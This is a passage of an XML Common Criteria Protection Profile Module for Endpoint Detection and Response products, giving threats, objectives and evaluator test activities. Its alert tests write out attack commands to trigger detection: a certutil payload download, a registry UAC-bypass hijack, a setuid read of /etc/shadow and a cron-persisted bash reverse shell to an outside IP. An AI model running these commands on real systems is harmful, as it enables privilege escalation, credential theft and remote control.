<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="..\transforms\module2html.xsl"?>

<?xml-model href="../transforms/schemas/CCModule.rng" type="application/xml" schematypens="http://relaxng.org/ns/structure/1.0"?>

<Module xmlns="https://niap-ccevs.org/cc/v1" xmlns:h="http://www.w3.org/1999/xhtml"
  name="Endpoint Detection and Response (EDR)" boilerplate="yes"
  target-products="Endpoint Detection and Response (EDR)">

  <PPReference>
    <ReferenceTable>
      <PPVersion>1.0</PPVersion>
      <PPAuthor>National Information Assurance Partnership</PPAuthor>
      <PPPubDate>2019-05-20</PPPubDate>
      <Keywords>EDR, ESM</Keywords>
    </ReferenceTable>
  </PPReference>

  <RevisionHistory>
    <entry>
      <version>1.0</version>
      <date>2019-05-20</date>
      <subject>Draft - first version released</subject>
    </entry>
  </RevisionHistory>


  <chapter title="Introduction" id="int">
    <section title="Overview" id="ppoverview"> This Protection Profile (PP) Module describes the
      security functionality of Endpoint Detection and Response (EDR) systems in terms of <abbr
        linkend="CC"/>, and defines functional and assurance requirements for such products. EDR is
      enterprise management software that collects endpoint host data to detect potentially
      unauthorized activity on endpoints and to enable threat hunting and other incident response
      actions to remediate malicious behaviors. These requirements cover basic security
      characteristics and behaviors for EDR products that operate in either a cloud or on-premises
      scenario. The platform on which the EDR runs may be a physical or virtual Operating System
      (OS) on-premises or in a cloud environment. <h:br/>
      <h:br/> EDR products rely on additional software running on the endpoint, called the Host
      Agent, to communicate commands or policy changes and to receive endpoint host data. Security
      requirements for the Host Agent are addressed in the separate <cite linkend="bibHAGT"/>
      Module. Evaluation of an EDR system will require multiple evaluations of different system
      components: one against this ESM EDR Module for the EDR server software and at least one other
      against the <cite linkend="bibHAGT"/> Module with its base <cite linkend="bibAppPP"/>. <h:br/>
      <h:br/> There are two primary architectural categories addressed by requirements in this
      PP-Module, as seen in the figure below.
      <h:ol>
        <h:li>Endpoints communicate over the Internet to an EDR hosted by a cloud service provider (Software as a Service).</h:li>
        <h:li>Endpoints communicate with an on-premises EDR in a hub and spoke network model.</h:li>
      </h:ol>
      <figure entity="images/edr_archi.png" title="Primary EDR Architectures" id="toe"/>
    </section>
    <section title="Terms" id="glossary">
      <subsection title="Common Criteria Terms">
        <glossary>
          <entry>
            <term>
              <abbr title="Common Criteria">CC</abbr>
            </term>
            <description>Common Criteria for Information Technology Security
              Evaluation.</description>
          </entry>
          <entry>
            <term>
              <abbr title="Common Evaluation Methodology">CEM</abbr>
            </term>
            <description>Common Evaluation Methodology for Information Technology Security
              Evaluation.</description>
          </entry>
          <entry>
            <term>
              <abbr title="Protection Profile">PP</abbr>
            </term>
            <description>An implementation-independent set of security requirements for a category
              of products.</description>
          </entry>
          <entry>
            <term>
              <abbr title="Protection Profile Module">PP-Module</abbr>
            </term>
            <description>An implementation-independent statement of security needs for a TOE type
              complementary to one or more Base Protection Profiles. </description>
          </entry>
          <entry>
            <term>
              <abbr title="Security Target">ST</abbr>
            </term>
            <description>A set of implementation-dependent security requirements for a specific
              product.</description>
          </entry>
          <entry>
            <term>
              <abbr title="Target of Evaluation">TOE</abbr>
            </term>
            <description> The product under evaluation. In this case, the Operating System as
              described in section <xref linkend="TOEboundary"/> and its supporting documentation.
            </description>
          </entry>
          <entry>
            <term>
              <abbr title="TOE Security Functionality">TSF</abbr>
            </term>
            <description>The security functionality of the product under evaluation.</description>
          </entry>
          <entry>
            <term>
              <abbr title="TOE Summary Specification">TSS</abbr>
            </term>
            <description>A description of how a <abbr linkend="TOE"/> satisfies the SFRs in a <abbr
                linkend="ST"/>. </description>
          </entry>
          <entry>
            <term>
              <abbr title="Security Functional Requirement">SFR</abbr>
            </term>
            <description>A requirement for security enforcement by the <abbr linkend="TOE"/>.
            </description>
          </entry>
          <entry>
            <term>
              <abbr title="Security Assurance Requirement">SAR</abbr>
            </term>
            <description>A requirement to assure the security of the <abbr linkend="TOE"/>.
            </description>
          </entry>
        </glossary>
      </subsection>
      <subsection title="Technical Terms">
        <glossary>
          <entry>
            <term>Alert</term>
            <description>An event or notification on the management portal that highlights
              potentially unauthorized activity. </description>
          </entry>
          <entry>
            <term>Management Portal</term>
            <description>A management interface for the configuration of EDR policy, visualization
              of collected endpoint alert data, and issuing of remediation commands.</description>
          </entry>
          <entry>
            <term>Endpoint</term>
            <description>A computing device that runs a General Purpose Operating System or a Mobile
              Device Operating System. Endpoints can include desktops, servers, and mobile devices.
            </description>
          </entry>
          <entry>
            <term>
              <abbr title="Endpoint Detection and Response">EDR</abbr>
            </term>
            <description>Server software that analyzes collected EDR Host Agent data for detecting,
              investigating, and remediating unauthorized activities on endpoints. The terms
                <h:i>TOE</h:i> and <h:i>EDR</h:i> are interchangeable in this
              document.</description>
          </entry>
          <entry>
            <term>Host Agent</term>
            <description>Complementary software that executes on endpoints to collect data about the
              endpoint, execute commands sent to the endpoint from an Enterprise Security Management
              (ESM) server or service. An example command sent to an endpoint could be to enforce a
              policy from an ESM, or to collect some files, or to run an OS command. For this PP,
              the Host Agent is required part of the TOE (EDR).</description>
          </entry>
          <entry>
            <term><abbr title="Endpoint Detection and Response">EDR</abbr> System</term>
            <description>EDR and its complementary Host Agent.</description>
          </entry>
          <entry>
            <term>SOC Analyst</term>
            <description>Security Operations Center (SOC) Analyst is typically the person
              responsible for reviewing potentially unauthorized activities via alerts and
              performing remediation and clean up.</description>
          </entry>
        </glossary>
      </subsection>
    </section>

    <section title="Compliant Targets of Evaluation" id="TOEdescription">
      <subsection title="TOE Boundary" id="TOEboundary"> The TOE boundary for the EDR encompasses
        all the software from the TOE vendor that represents the server or enterprise management
        side of the EDR System. This will typically, but not always, be software running behind a
        web application or dashboard, and possibly with other software services running to send and
        receive data with a Host Agent. The EDR may also make use of a database to store collected
        and analyzed data. Any database software itself is outside the scope of the TOE, as is any
        web server software used to serve a web application or dashboard, and the underlying
        operating system or cloud platform. The figure below shows EDR (right) communicating with
        its Host Agent (left) over an untrusted network. <h:br/> The requirements for the Host Agent
        are not covered in this Module, however it is expected that an EDR System will evaluate once
        against this ESM EDR Module for the EDR and at least once more against the <cite
          linkend="bibHAGT"/> Module with its base <cite linkend="bibAppPP"/>. <figure
          entity="images/edr_overview.png" title="EDR and Host Agent Communications" id="toe"/>
      </subsection>
      <subsection title="TOE Platform" id="TOEplatform"> The TOE platform, which consists of the
        Operating System or Cloud platform on which the EDR software executes and is outside the
        scope of evaluation. At the same time, the security of the EDR relies upon it. <h:br/> Any
        communications with trusted remote file reputation or threat intelligence services is
        relevant to overall EDR System security but is also outside the scope of evaluation.
      </subsection>
    </section>

    <section title="Use Cases" id="usecases"> Requirements in this PP-Module are designed to address
      the security problems in at least the following use cases. An EDR's functionality may be
      extended by addons, plugins, threat feeds, or other reputation services. These are out of
      scope of this Module. <usecases>
        <usecase title="Detection of Potential Unauthorized Activity" id="detect">
          <description>The detection of potentially unauthorized activity, software, or users is
            enabled by the collection of host-based endpoint data to a central EDR where the data is
            analyzed. </description>
        </usecase>
        <usecase title="Remediation of Malicious Activity" id="response">
          <description>The ability to initiate remediation commands to attempt a clean up of
            detected malicious activity is a key use case of EDR. </description>
        </usecase>
        <usecase title="Discovery" id="discovery">
          <description>The capability to effectively browse, query, and export aggregated host-based
            endpoint data enables a SOC analyst to discover adversaries in post-compromise
            scenarios. </description>
        </usecase>
      </usecases>
    </section>
  </chapter>

  <chapter title="Conformance Claims" id="conf">
    <cclaims>
      <cclaim title="Conformance Statement">
        <description>
          <h:p>This <abbr linkend="PP-Module"/> inherits exact conformance as required from the
            Application Software PP <cite linkend="bibAppPP"/> and as defined in the <abbr linkend="CC"/>
            and <abbr linkend="CEM"/> addenda for Exact Conformance, Selection-Based SFRs, and Optional
            SFRs (dated May 2017).<h:br/><h:br/>
            This <abbr linkend="PP-Module"/> extends the baseline Security Functional Requirements (SFRs)
            and Security Assurance Requirements (SARs) for application software products.
            Evaluation Activities are the actions that the evaluator performs in
            order to determine an EDR's compliance to the SFRs. </h:p>
        </description>
      </cclaim>
      <cclaim title="CC Conformance Claims">
        <description>This <abbr linkend="PP-Module"/> is conformant to Parts 2 (extended) and 3 
          (conformant) of Common Criteria Version 3.1, Release 5 [<abbr linkend="CC"/>].
          In order to be conformant to this PP-Module, the ST must include all components
          in this PP-Module and the associated <cite linkend="bibAppPP"/> that are:
          <h:ol>
            <h:li>unconditional (always required)</h:li>
            <h:li>selection-based (required when certain selections are chosen in the unconditional requirements)</h:li>
          </h:ol>
          and may include optional and/or objective components that are desirable but not required for conformance.
        </description>
      </cclaim>
      <cclaim title="Package Claims">
        <description>This <abbr linkend="PP-Module"/> is TLS Package Version 1.1 Conformant.</description>
      </cclaim>
    </cclaims>
  </chapter>

  <chapter title="Security Problem Description" id="spd"> The security problem is described in terms
    of the threats that the <abbr linkend="EDR"/> is expected to address, assumptions about the
    operational environment, and any organizational security policies that the <abbr linkend="EDR"/>
    is expected to enforce.
    <section title="Threats" id="threats">
      <threats>
        <threat id="T.NETWORK_ATTACK">
          <description>An attacker is positioned on a communications channel or elsewhere on the network infrastructure. 
            Attackers may engage in communications with the application software or alter communications between the 
            application software and other endpoints in order to compromise it.</description>
          <objective-refer ref="O.PROTECTED_TRANSIT">
            <rationale>The threat T.NETWORK_ATTACK is countered by O.PROTECTED_TRANSIT as this
              provides for confidentiality of transmitted data between the EDR and enrolled Host
              Agents.</rationale>
          </objective-refer>
        </threat>
        <threat id="T.NETWORK_EAVESDROP">
          <description>An attacker is positioned on a communications channel or elsewhere on the network infrastructure. 
            Attackers may monitor and gain access to data exchanged between the application and other endpoints.</description>
          <objective-refer ref="O.PROTECTED_TRANSIT">
            <rationale>The threat T.NETWORK_EAVESDROP is countered by O.PROTECTED_TRANSIT as this
              provides for confidentiality of transmitted data between the EDR and enrolled Host
              Agents.</rationale>
          </objective-refer>
        </threat>
        <threat id="T.PHYSICAL_ACCESS">
          <description>An attacker may try to access sensitive data at rest.</description>
          <objective-refer ref="O.ACCOUNTABILITY">
            <rationale>The threat T.PHYSICAL_ACCESS is countered by O.ACCOUNTABILITY as this
            provides the capability to log attempts by unauthorized personnel to access
            data.</rationale>
          </objective-refer>
        </threat>
        <threat id="T.MISCONFIGURATION">
          <description>An attacker is a legitimate privileged user with access to change
            the configuration of the <abbr linkend="EDR"/>'s security capabilities. Attackers may
            attempt to hide malicious activities from other privileged users.</description>
          <objective-refer ref="O.MANAGEMENT">
            <rationale>The threat T.MISCONFIGURATION is countered by O.MANAGEMENT as this
            provides for management and audit of administrative activities.</rationale>
          </objective-refer>
        </threat>
        <threat id="T.CREDENTIAL_REUSE">
          <description>An attacker is positioned on a communications channel or elsewhere on the
            network infrastructure. Attackers may guess or harvest legitimate credentials from the
            EDR, endpoints, or insecure network activity.</description>
          <objective-refer ref="O.PROTECTED_TRANSIT">
            <rationale>The threat T.CREDENTIAL_REUSE is countered by O.PROTECTED_TRANSIT as this
              provides for confidentiality of transmitted data.</rationale>
          </objective-refer>
          <objective-refer ref="O.PROTECTED_STORAGE">
            <rationale>The threat T.CREDENTIAL_REUSE is countered by O.PROTECTED_STORAGE (from AppPP) as this
              provides for confidentiality of locally stored credentials.</rationale>
          </objective-refer>
          <objective-refer ref="O.PROTECTED_MEMORY">
            <rationale>The threat T.CREDENTIAL_REUSE is countered by O.PROTECTED_MEMORY as this
              provides for confidentiality of data in use.</rationale>
          </objective-refer>
        </threat>
      </threats>
    </section>
    <section id="Assumptions" title="Assumptions">
      <assumptions>
        <assumption id="A.CONNECTIVITY">
          <description>The <abbr linkend="EDR"/> relies on network connectivity to carry out its
          management activities. The <abbr linkend="EDR"/> will robustly handle instances when
          connectivity is unavailable or unreliable.</description>
          <objective-refer ref="OE.RELIABLE_TRANSIT">
            <rationale>The Operational Environment objective OE.RELIABLE_TRANSIT is realized through
            A.CONNECTIVITY.</rationale>
          </objective-refer>
        </assumption>
      </assumptions>
    </section>
  </chapter>

  <chapter title="Security Objectives" id="obj">
    <section title="Security Objectives for the TOE" id="SecurityObjectivesTOE">
      <SOs>
        <SO id="O.MANAGEMENT">
          <description>The <abbr linkend="TOE"/> must facilitate management by the enterprise,
            providing consistent and supported interfaces for their security-relevant configuration,
            maintenance, and operation.</description>
          <component-refer ref="FMT_SMR.1"/>
          <component-refer ref="FMT_SMF_EXT.1"/>
          <component-refer ref="FMT_SRF_EXT.1"/>
          <consistency-rationale/>
        </SO>
        <SO id="O.ACCOUNTABILITY">
          <description>The <abbr linkend="TOE"/> must provide logging facilities which record
            management actions undertaken by management users.</description>
          <component-refer ref="FAU_DAS_EXT.1"/>
          <consistency-rationale/>
        </SO>
        <SO id="O.PROTECTED_TRANSIT">
          <description>To address both passive (eavesdropping) and active (packet modification)
            network attack threats, conformant <abbr title="Target of Evaluation" linkend="TOE"
              >TOE</abbr>s will use a trusted channel to protect all communications. Sensitive data
            includes cryptographic keys, passwords, and any other data specific to the application
            that should not be exposed outside of the application or to unauthenticated users.</description>
          <component-refer ref="FCS_DTLSS_EXT.1 (from TLS Package)"/>
          <component-refer ref="FCS_DTLSC_EXT.1 (from TLS Package)"/>
          <component-refer ref="FCS_TLSC_EXT.1 (from TLS Package)"/>
          <component-refer ref="FCS_TLSC_EXT.2 (from TLS Package)"/>
          <component-refer ref="FCS_TLSS_EXT.1 (from TLS Package)"/>
          <component-refer ref="FCS_TLSS_EXT.2 (from TLS Package)"/>
          <component-refer ref="FTP_TRP.1"/>
          <component-refer ref="FTP_ITC.1"/>
          <consistency-rationale>This objective extends the <abbr linkend="Base-PP"/>'s O.COMMS
            objective by ensuring that the communications related to the <abbr linkend="EDR"/> and
            enrolled Host Agents are secured in the same manner as other sensitive data.
          </consistency-rationale>
        </SO>
      </SOs>
    </section>
    <section title="Security Objectives for the Operational Environment"
      id="SecurityObjectivesTOEorEnvironment">The following security objectives for the operational
      environment assist the EDR in correctly providing its security functionality. These track with
      the assumptions about the environment. <SOEs>
        <SOE id="OE.PLATFORM">
          <description>The <abbr linkend="EDR"/> relies on a trusted Operating System or Cloud
            platform.</description>
          <consistency-rationale/>
        </SOE>
        <SOE id="OE.PROPER_USER">
          <description>The user of the <abbr linkend="EDR"/> is not willfully negligent or hostile,
            and uses the software within compliance of the applied enterprise security policy.
            Standard user accounts are provisioned in accordance with the least privilege model.
            Users requiring higher levels of access should have a separate account dedicated for
            that use. </description>
          <consistency-rationale> This objective is inherited from the Base-PP.</consistency-rationale>
        </SOE>
        <SOE id="OE.PROPER_ADMIN">
          <description>The administrator of the <abbr linkend="EDR"/> is not careless, willfully
            negligent or hostile, and administers the EDR within compliance of the applied
            enterprise security policy. </description>
          <consistency-rationale> This objective is inherited from the Base-PP.</consistency-rationale>
        </SOE>
        <SOE id="OE.RELIABLE_TRANSIT">
          <description>Wired or wireless network traffic between the <abbr linkend="EDR"/> and
            host agents will be consistently and always available unless specific in evaluation
            activity tests.</description>
          <consistency-rationale/>
        </SOE>
      </SOEs>
    </section>
    <section id="secconrat" title="Security Objectives Rationale"> </section>
  </chapter>

  <chapter title="Security Requirements" id="req">

    <base-pp product="application" version="1.3" name="Application Software" short="AppPP"
      url="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=394&amp;id=394"
      xmlurl="https://raw.githubusercontent.com/commoncriteria/application/c51970161d3a47fe8a7c23552f372745a638ba7d/input/application.xml">
      <modified-sfrs/>
      <additional-sfrs/>

      <con-toe> If this PP-Module is used to extend the Application Software PP, the TOE type for
        the overall TOE is still an Software-based Application. The TOE boundary is simply extended
        to include the EDR functionality that is built into the Application so that additional
        security functionality is claimed within the scope of the TOE. </con-toe>

      <con-sec-prob/>
      <con-obj/>
      <con-op-en> This PP-Module does not define any objectives for the TOE's operational
        environment. </con-op-en>

    </base-pp>

    <man-sfrs>
        <subsection title="Security Audit (FAU)" id="fau">

          <f-component id="fau_alt_ext.1" name="Server Alerts">
            <consistency-rationale> This SFR defines auditable alerts for the EDR. It does not
              impact the Application Software PP functionality. </consistency-rationale>
            <f-element id="fau_alt_ext.1.1">
              <title>The <abbr linkend="EDR"/> shall alert authorized users on a management portal
                in the event of any of the following: <h:ol type="a">
                  <h:li>Change in Host Agent enrollment status</h:li>
                  <h:li>Detection of potentially unauthorized activity on enrolled endpoints</h:li>
                </h:ol>
              </title>
              <note role="application"> The intent of this requirement is to specify the minimum set
                of management dashboard alert capabilities the <abbr linkend="EDR"/> must be capable
                of displaying to an authorized user. <h:br/><h:br/>
                Examples of Detection of potentially unauthorized activity on enrolled endpoints include;
                anomalous activity, escalation of privileges, and lateral movemen.
              </note>
              <aactivity>
                <TSS>The evaluator shall examine the TSS to ensure that it describes how alerts for changes in Host Agent
                  enrollment status and potentially unauthorized activities are detected and displayed.
                </TSS>
                <Guidance> The evaluator shall review operational guidance to ensure that it
                  contains documentation on enrolling and unenrolling Host Agents from the
                  EDR.<h:br/><h:br/> The evaluator shall review operational guidance to identify a
                  list of unauthorized activity types categorized or labeled by the EDR upon
                  detection. <h:br/><h:br/> 
                The evaluator shall ensure guidance includes any needed configuration information for displaying alerts 
                  in relation to for changes in Host Agent enrollment status and potentially unauthorized activities.
                </Guidance>
                <Tests>The evaluator shall perform the following tests:<h:br/><h:br/> The evaluator
                  shall follow guidance to enroll a Host Agent to the EDR and verify that the
                  enrollment action is recorded in an auditable and timestamped activity log.<h:br/><h:br/>
                  <h:b>For Windows,</h:b> the evaluator shall test the EDR's ability to detect
                  anomalous activity by performing the following sub-tests on an enrolled Host Agent's
                  system for each platform list that is supported, verifying for each that corresponding
                  alerts were generated in the management dashboard:<h:br/>
                  <testlist>
                    <test>The evaluator shall open a Windows command prompt as a user and run the
                      command <h:code>cmd /c certutil -urlcache -split -f &#60;remote file&#62;
                        &#60;download directory&#62;</h:code> where remote file is a valid file path
                      to an accessible, remotely stored executable, and download directory is a
                      valid directory path writable by the current local user. </test>
                    <test>The evaluator shall open a Windows command prompt as a user and run the
                      command <h:code>reg.exe add hkcu\software\classes\mscfile\shell\open\command
                        /ve /d "&#60;local executable&#62;" /f</h:code> where local executable is a
                      valid file path to a readable, local executable. The evaluator will then run
                      the command <h:code>cmd.exe /c eventvwr.msc</h:code> in the same command
                      prompt window. </test>
                    <test>The evaluator shall open a Windows command prompt as a user and run the
                      command <h:code>SCHTASKS /Create /SC ONCE /TN spawn /TR &#60;local
                        executable&#62;" /ST &#60;time&#62;</h:code> where local executable is a
                      valid file path to a readable, local executable and time is a start time that
                      occurs within minutes of the task being created. </test>
                  </testlist>
                  <h:b>For Linux,</h:b> the evaluator shall test the EDR's ability to detect
                  anomalous activity by performing the following subtests based on the platform of
                  the enrolled Host Agent's system, verifying for each that corresponding alerts
                  were generated in the management dashboard::<h:br/>
                  <testlist>
                    <test>The evaluator shall open a terminal and run the command <h:code>scp
                    &#60;remote user&#62;@&#60;remote host&#62;:&#60;remote path&#62;
                    &#60;download directory&#62;</h:code> where remote user is a valid user on
                    remote host, remote path is a valid path to a remotely stored executable, and
                    download directory is a valid directory path writable by the current local
                    user. The remote user's password shall be provided when prompted. </test>
                    <test>The evaluator shall open a terminal and run the command <h:code>sudo chown
                    root &#60;provided executable&#62;</h:code> and <h:code>sudo chmod u+s
                    &#60;provided executable&#62;</h:code> before executing the program with
                    <h:code>./&#60;provided executable&#62; &#60; "cat /etc/shadow"</h:code>.
                    The user's administrative password shall be provided when prompted.</test>
                    <test>The evaluator shall open a terminal and run the command <h:code>echo
                      "bash -i >&amp; /dev/tcp/&#60;outside IP&#62;/5050 0>&amp;1 1 &amp;" &#62; 
                    /etc/cron.hourly/persist;</h:code> where outside IP is a valid
                      external address.</test>
                  </testlist>
                  
                  The evaluator shall follow guidance to unenroll a Host Agent from the
                  EDR and verify that the unenrollment action is recorded in an auditable and
                  timestamped activity log. </Tests>
              </aactivity>
            </f-element>
            <f-element id="fau_alt_ext.1.2">
              <title>The <abbr linkend="EDR"/> shall provide a visualization of detected alerts of
                potentially unauthorized incidents, and shall include: <h:ol type="a">
                  <h:li>An initial incident severity and <selectables>
                      <selectable>assessment</selectable>
                      <selectable>categorization</selectable>
                      <selectable>score</selectable>
                      <selectable>ranking</selectable>
                    </selectables>
                  </h:li>
                  <h:li>An incident timeline</h:li>
                </h:ol>
              </title>
              <note role="application"> The intent of this requirement is to specify the minimum set
                of incident visualizations the <abbr linkend="EDR"/> must be capable of displaying
                to an authorized user. Visualization is broadly defined as the display of incident
                data to an authorized user on the management dashboard. The visualization is not
                required to be interactive. </note>
              <aactivity>
                <TSS>There are no TSS activities for this requirement.</TSS>
                <Guidance> The evaluator shall review the operational guidance to ensure that it
                  contains documentation on using the management portal to visualize and view
                  alerts. </Guidance>
                <Tests> The evaluator shall review an alert on the management portal and verify that
                  the alert contains a severity field and the field(s) selected from the requirement
                  selection. The evaluator will open or view the alert and verify that a timeline of
                  events is available for review. The timeline shall show a progression of events
                  over time. </Tests>
              </aactivity>
            </f-element>
            <f-element id="fau_alt_ext.1.3">
              <title>The <abbr linkend="EDR"/> shall provide a data export capability for
                  selected alerts with a specified standards-based format of <selectables
                  linebreak="yes">
                  <selectable>Structured Threat Information eXpression (STIX)</selectable>
                  <selectable>Cyber Observable eXpression (CybOX)</selectable>
                  <selectable>Incident Object Description Exchange Format (IODEF)</selectable>
                  <selectable>Common Event Format (CEF)</selectable>
                  <selectable>Log Event Extended Format (LEEF)</selectable>
                </selectables>. </title>
              <note role="application"> The intent of this requirement is to specify a selection of
                standards-based formats the EDR must provide for the export of selected alerts. </note>
              <aactivity>
                <TSS>There are no TSS activities for this requirement.</TSS>
                <Guidance>The evaluator shall review the operational guidance to ensure that it
                  contains documentation on the products supported for exporting alerts in standards
                  based formats.</Guidance>
                <Tests> The evaluator shall pick an alert on the management portal and export the
                  alert in every format possible. The evaluator shall review the operational
                  guidance and the selection from the requirement and verify that export options
                  exist for all the declared formats in the selection. After exporting one alert for
                  each possible format the evaluator shall review the file contents of the exported
                  alert and verify it is the correct format for the selected export option (for
                  example, an export of the IODEF type must contain 'IODEF-Document' in the first
                  element of the exported file). </Tests>
              </aactivity>
            </f-element>
          </f-component>

          <f-component id="fau_das_ext.1" name="Management Dashboard Audit">
            <consistency-rationale> This SFR defines the minimum event data that the EDR Server must
              record about authorized management portal activity. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            <f-element id="fau_das_ext.1.1">
              <title>The <abbr linkend="EDR"/> shall generate audit log data for investigation and
                remediation actions initiated automatically or by authorized users, including: <h:ol
                  type="a">
                  <h:li>EDR management portal login activity</h:li>
                  <h:li>Remediation commands sent to a Host Agent, affected endpoint, or network
                    devices</h:li>
                  <h:li>EDR configuration changes</h:li>
                  <h:li><assignable>Other auditable events</assignable></h:li>
                </h:ol>
              </title>
              <note role="application">The intent of this requirement is to specify the minimum set
                of audit records collected about actions on the management dashboard. </note>
              <aactivity>
                <TSS>There are no TSS activities for this requirement.</TSS>
                <Guidance> The evaluator shall check the administrative guide and ensure that it
                  lists all of the collectable types of endpoint event data. The evaluator shall
                  check to make sure that every endpoint event data type selected in the ST is
                  included in the administrative guidance.</Guidance>
                <Tests>The evaluator shall perform the following tests:
                  <testlist>
                    <test>The evaluator shall login to the EDR management dashboard and verify that audit
                    log data describing the activity is recorded.</test>
                    <test>The evaluator shall issue a valid remediation command provided by the EDR to
                    a Host Agent and verify that audit log data describing the activity is recorded.</test>
                    <test>The evaluator shall change a non-destructive EDR configuration option within the EDR management
                    dashboard, change it back to the original setting, and verify that the audit log data describing
                    the activity is recorded.</test>
                  </testlist>                
                </Tests>
              </aactivity>
            </f-element>
          </f-component>

          <f-component id="fau_col_ext.1" name="Collected Audit">
            <consistency-rationale> This SFR defines the minimum event data that the EDR collects
              from a Host Agent. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>

            <f-element id="fau_col_ext.1.1">
              <title>The <abbr linkend="EDR"/> shall collect the following minimum set of endpoint
                data from a Host Agent: <h:ol type="a">
                  <h:li>Operating System (OS) version, architecture, and IP Address</h:li>
                  <h:li>Privileged and unprivileged endpoint account login activity</h:li>
                  <h:li>Process creation</h:li>
                  <h:li>Libraries and modules loaded by processes</h:li>
                  <h:li>Files created on persistent storage</h:li>
                  <h:li><assignable>Other host data</assignable></h:li>
                </h:ol>
              </title>
              <note role="application">The intent of this requirement is to specify the minimum set
                of endpoint data that the EDR must be capable of collecting. </note>
              <aactivity>
                <TSS>The evaluator shall verify that all endpoint event data types selected in the ST is
                  listed in the operational guidance.</TSS>
                <Guidance>The evaluator shall review the operational guidance and ensure that it
                  lists all of the collectable types of endpoint event data.</Guidance>
                <Tests>The evaluator shall perform the following tests:
                  <testlist>
                    <test>The evaluator shall verify the OS version, architecture, and IP address of
                    a system managed by a Host Agent against the data reported to the EDR management
                    dashboard.</test>
                    <test>The evaluator shall login to a system managed by a Host Agent with two separate
                    accounts and verify that the activity is accurately reported to the EDR management dashboard.</test>
                    <test>The evaluator shall run a known user application provided on the platform OS and verify
                    that subsequent process creation and module loading is accurately reported to the EDR management
                    dashboard.</test>
                    <test>The evaluator shall create a new non-empty document within persistent storage and verify
                    that the activity is accurately reported to the EDR management dashboard.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>

        </subsection>

        <subsection title="Identification and Authentication (FIA)" id="fia">

          <f-component id="fia_uau_ext.1" name="Dashboard Authentication Mechanisms">
            <consistency-rationale> This SFR defines authentication mechanisms for the EDR. It does
              not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            <f-element id="fia_uau_ext.1.1">
              <title> The <abbr linkend="EDR"/> shall provide the following authentication
                mechanisms, authentication based on username and password and <selectables
                  linebreak="yes">
                  <selectable>authentication with external Smartcard and PIN</selectable>
                  <selectable>no other factors</selectable>
                </selectables> to support logins to any management portal, dashboard, or API. </title>
              <note role="application"> </note>
              <aactivity>
                <TSS>There are no TSS activities for this requirement.</TSS>
                <Guidance>The evaluator shall review the operational guidance to ensure that it
                  contains documentation on configuring any supported multi-factor authentication
                  mechanisms.</Guidance>
                <Tests>The evaluator shall create an account with a username and password, verifying
                that login authentication is case-sensitive. If additional factors are provided, each
                factor shall be tested for login access with strictly unanimous authentication for those
                enabled. The evaluator shall verify that login access is granted for correct credentials
                and denied in cases of incorrect credentials across available factors.</Tests>
              </aactivity>
            </f-element>
          </f-component>

          <f-component id="fia_pwd_ext.1" name="Password Authentication">
            <consistency-rationale> This SFR defines specific authentication functions for
              passwords. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            <f-element id="fia_pwd_ext.1.1">
              <title>The <abbr linkend="EDR"/> shall support the following for the Password
                Authentication Factor: <h:ol>
                  <h:li>Passwords shall be able to be composed of any combination of <selectables>
                      <selectable>upper and lower case letters</selectable>
                      <selectable><assignable>a character set of at least 52
                        characters</assignable></selectable>
                    </selectables>, numbers, and special characters: <selectables>
                      <selectable>"!"</selectable>
                      <selectable>"@"</selectable>
                      <selectable>"#"</selectable>
                      <selectable>"$"</selectable>
                      <selectable>"%"</selectable>
                      <selectable>"^"</selectable>
                      <selectable>"&#38;"</selectable>
                      <selectable> "*"</selectable>
                      <selectable>"("</selectable>
                      <selectable>")"</selectable>
                      <selectable><assignable>other characters</assignable></selectable>
                    </selectables>
                  </h:li>
                  <h:li>Password length up to <assignable>an integer greater than or equal to
                      14</assignable> characters shall be supported. </h:li>
                </h:ol>
              </title>
              <note role="application"> The <abbr linkend="ST"/> author selects the character set:
                either the upper and lower case Basic Latin letters or another assigned character
                set containing at least 52 characters. The assigned character set must be well
                defined: either according to an international encoding standard (such as Unicode) or
                defined in the assignment by the <abbr linkend="ST"/> author. The <abbr linkend="ST"
                /> author also selects the special characters that are supported by <abbr
                  linkend="TOE"/>; they may optionally list additional special characters supported
                using the assignment. </note>
              <aactivity>
                <TSS> </TSS>
                <Guidance>The evaluator shall review the operational guidance to ensure that it
                  contains documentation on default password policy.</Guidance>
                <Tests>The evaluator shall perform the following tests:
                  <testlist>
                    <test>The evaluator shall attempt to modify a user's password to be less than 14 characters
                    in length.</test>
                    <test> The evaluator shall verify that password composition rules present in operational guidance
                      are enforced. While the evaluator is not required (nor is it feasible) to test all possible
                      composition rules, the evaluator shall ensure that all characters, and rule characteristics
                      listed in the requirement are supported.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>

        </subsection>

        <subsection title="Security Management (FMT)" id="fmt">

          <f-component id="FMT_SMR.1" name="Security Management Roles">
            <consistency-rationale> This SFR defines a specific set of management roles for an EDR.
              It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            <f-element id="FMT_SMR.1.1">
              <title>The <selectables>
                  <selectable>EDR</selectable>
                  <selectable>EDR platform</selectable>
                </selectables> shall maintain the roles of administrator, SOC analyst, read-only
                user, and <selectables><selectable><assignable>additional authorized roles</assignable>
                </selectable><selectable>no other roles</selectable></selectables>.</title>
              <note role="application">The <abbr linkend="EDR"/> will be configured, maintained, and
                used by different user roles. At a minimum, one administrative role shall be
                supported, one SOC analyst who can issue remediation commands to host agents, and
                one read-only user who can only view data. <h:br/> The user accounts need not be
                named literally, but they must have the implication of such roles. The assignment is
                used by the <abbr linkend="ST"/> author to list any other roles that are supported.</note>
              <aactivity>

                <TSS> The evaluator shall examine the <abbr linkend="TSS"/> to verify that it
                  describes the roles and the powers granted to and limitations of the role. </TSS>
                <Guidance> The evaluator shall review the operational guidance to ensure that it
                  contains instructions for administering the <abbr linkend="EDR"/> and which user
                  roles are supported and which permissions each default role has.</Guidance>
                  <Tests>
                    <testlist>
                      <test>The evaluator shall verify that the roles of administrator, SOC analyst, and
                        read-only user are available by default, creating individual accounts with each
                        role assigned.</test>
                      <test>The evaluator shall verify that non-administrator roles are not able to modify
                      the roles of their own account or those of others.</test>
